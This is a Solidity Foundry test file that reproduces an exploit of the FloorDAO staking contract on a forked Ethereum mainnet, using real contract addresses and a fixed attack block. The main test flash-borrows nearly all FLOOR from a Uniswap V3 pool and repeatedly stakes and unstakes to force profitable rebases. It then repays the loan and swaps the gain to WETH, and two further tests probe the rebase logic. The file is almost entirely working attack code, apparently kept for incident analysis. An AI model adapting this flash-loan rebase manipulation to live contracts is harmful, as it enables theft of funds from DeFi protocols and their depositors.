// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

interface FloorStaking {
    struct Epoch {
        uint256 length; // in seconds
        uint256 number; // since inception
        uint256 end; // timestamp
        uint256 distribute; // amount
    }
    function stake(address _to, uint256 _amount, bool _rebasing, bool _claim) external returns (uint256);
    function unstake(address _to, uint256 _amount, bool _trigger, bool _rebasing) external returns (uint256 amount_);

    function epoch() external returns (uint256 length, uint256 number, uint256 end,uint256 distribute);

    function wrap(address _to, uint256 _amount) external returns (uint256 gBalance_);

    function rebase() external returns (uint256);
}
 
 
interface IsFloor is IERC20 {
    function circulatingSupply() external returns(uint256);
}

contract FloorDAOAttacker is Test {
    IUniswapV3Pool floor_weth = IUniswapV3Pool(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0);
    IERC20 floor = IERC20(0xf59257E961883636290411c11ec5Ae622d19455e);
    FloorStaking staking =  FloorStaking(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);
    IERC20 gFloor = IERC20(0xb1Cc59Fc717b8D4783D41F952725177298B5619d);
    IsFloor sFloor = IsFloor(0x164AFe96912099543BC2c48bb9358a095Db8e784);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    uint256 flashAmount;

    function setUp() public {
        vm.createSelectFork("eth");
        vm.label(address(floor_weth), "UniswapV3Pool: floor-weth");
        vm.label(address(floor), "floor");
        vm.label(address(staking), "FloorStaking");
        vm.label(address(gFloor), "gFloor");
        vm.label(address(sFloor), "sFloor");
    }

    function testExploit() external {
        uint attackBlockNumber = 18068772;
        // uint attackBlockNumber = 17068772;
        vm.rollFork(attackBlockNumber);
        (, uint256 number, uint256 end, ) = staking.epoch();
        emit log_named_uint("Epoch number", number);
        emit log_named_uint("Epoch end", end);
        emit log_named_decimal_uint("floor balanceOf StakingPool", floor.balanceOf(address(staking)), floor.decimals());
        emit log_named_decimal_uint("floor balanceOf Pair", floor.balanceOf(address(floor_weth)), floor.decimals());
        emit log_named_decimal_uint("sFloor sirculatingSupply", sFloor.circulatingSupply(), sFloor.decimals());

        flashAmount = floor.balanceOf(address(floor_weth)) - 1;
        floor_weth.flash(address(this), 0, flashAmount, "");

        uint256 profitAmount = floor.balanceOf(address(this));
        emit log_named_decimal_uint("floor balance after exploit", profitAmount, floor.decimals());
        floor_weth.swap(address(this), false, int256(profitAmount), uint160(0xfFfd8963EFd1fC6A506488495d951d5263988d25), "");
        emit log_named_decimal_uint("weth balance after swap", weth.balanceOf(address(this)), weth.decimals());
    }

    function uniswapV3FlashCallback(uint256 /*fee0*/ , uint256 fee1, bytes calldata) external {
        uint i = 0;
        while(i < 17) {
            uint balanceAttacker = floor.balanceOf(address(this));
            uint balanceStaking = floor.balanceOf(address(staking));
            uint circulatingSupply = sFloor.circulatingSupply();
            if (balanceAttacker + balanceStaking > circulatingSupply) {  // will produce profit in next epoch
                floor.approve(address(staking), balanceAttacker);
                staking.stake(address(this), balanceAttacker, false, true); // get gFloor
                uint gFloorBalance = gFloor.balanceOf(address(this));
                staking.unstake(address(this), gFloorBalance, true, false);
                i += 1;
            }
        }
        floor.transfer(msg.sender, flashAmount + fee1);
    }

    function uniswapV3SwapCallback(int256 /*amount0Delta*/, int256 amount1Delta, bytes calldata /*data*/) external {
        int256 amount = amount1Delta;
        if (amount <= 0) {
            amount = 0 - amount;
        }
        floor.transfer(msg.sender, uint256(amount));
    }

    function testsFloor() external {
        uint attackBlockNumber = 18068772;
        vm.rollFork(attackBlockNumber);

        deal(address(floor), address(this), 152_000 * 10**9);

        uint balanceAttacker = floor.balanceOf(address(this));
        emit log_named_decimal_uint("Initial attacker floor", balanceAttacker, floor.decimals());

        floor.approve(address(staking), type(uint256).max);
        sFloor.approve(address(staking), type(uint256).max);

        staking.stake(address(this), balanceAttacker, true, true);  // get sFloor
        uint sFloorBalance = sFloor.balanceOf(address(this));
        
        // uint gFloorBalance = staking.wrap(address(this), sFloorBalance);
        // staking.unstake(address(this), gFloorBalance, true, false);  // unstake by gFloor
        staking.unstake(address(this), sFloorBalance, true, true);  // unstake by sFloor

        balanceAttacker = floor.balanceOf(address(this));
        emit log_named_decimal_uint("Finally attacker floor", balanceAttacker, floor.decimals());
        emit log_named_decimal_uint("Finally attacker sFloor", sFloor.balanceOf(address(this)), sFloor.decimals());
    }

    function testOthers() external {
        uint attackBlockNumber = 18068772;
        vm.rollFork(attackBlockNumber);

        deal(address(floor), address(0x1234), 100 * 10**9);
        vm.startPrank(address(0x1234));
        floor.approve(address(staking), type(uint256).max);
        staking.stake(address(0x1234), 100 * 10**9, true, true);  // get sFloor
        vm.stopPrank();

        deal(address(floor), address(this), 100_000 * 10**9);

        uint balanceAttacker = floor.balanceOf(address(this));
        floor.approve(address(staking), type(uint256).max);
        sFloor.approve(address(staking), type(uint256).max);
        staking.stake(address(this), balanceAttacker, false, true);  // get sFloor
        uint gFloorBalance = gFloor.balanceOf(address(this));
        staking.unstake(address(this), gFloorBalance, true, false);
        balanceAttacker = floor.balanceOf(address(this));
        emit log_named_decimal_uint("Finally attacker Floor", balanceAttacker, floor.decimals());
        emit log_named_decimal_uint("Finally 0x1234 sFloor", sFloor.balanceOf(address(0x1234)), sFloor.decimals()); // same increased rate
    }

}